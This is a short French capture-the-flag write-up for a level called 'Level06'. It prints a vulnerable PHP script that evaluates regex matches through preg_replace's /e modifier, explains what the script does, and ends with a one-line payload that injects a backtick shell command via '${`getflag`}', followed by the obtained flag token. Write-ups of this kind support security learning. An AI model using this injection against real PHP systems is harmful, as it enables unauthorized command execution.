# Level06

```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

Ce code PHP effectue des opérations de manipulation sur une chaîne de caractères contenue dans un fichier spécifié par deux arguments en ligne de commande. Voici ce que font les fonctions et le code principal :

1) La fonction y($m) prend une chaîne de caractères $m en entrée. Elle utilise preg_replace pour effectuer deux remplacements dans la chaîne :

    - Elle remplace tous les points . par des espaces x.
    - Elle remplace tous les caractères @ par des y.
La chaîne modifiée est ensuite renvoyée.

2) La fonction x($y, $z) prend deux arguments $y et $z. Elle lit le contenu d'un fichier spécifié par $y en utilisant file_get_contents. Ensuite, elle applique trois remplacements à ce contenu :

    - Elle utilise une expression régulière pour rechercher des motifs de la forme [x ...] (où ... peut être n'importe quelle séquence de caractères) et exécute la fonction y(...) sur cette séquence au sein de ces crochets en utilisant preg_replace avec l'option /e (évaluation).
    - Elle remplace tous les crochets [ par des parenthèses (.
    - Elle remplace tous les crochets ] par des parenthèses ).
Le contenu modifié est renvoyé.

3) Dans le code principal, une variable $r est initialisée en appelant la fonction x avec les deux premiers arguments de la ligne de commande ($argv[1] et $argv[2]).

4) Enfin, la variable $r est imprimée à la sortie standard.

```bash
echo '[x ${`getflag`} ]' > /tmp/foo && ./level06 /tmp/foo
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
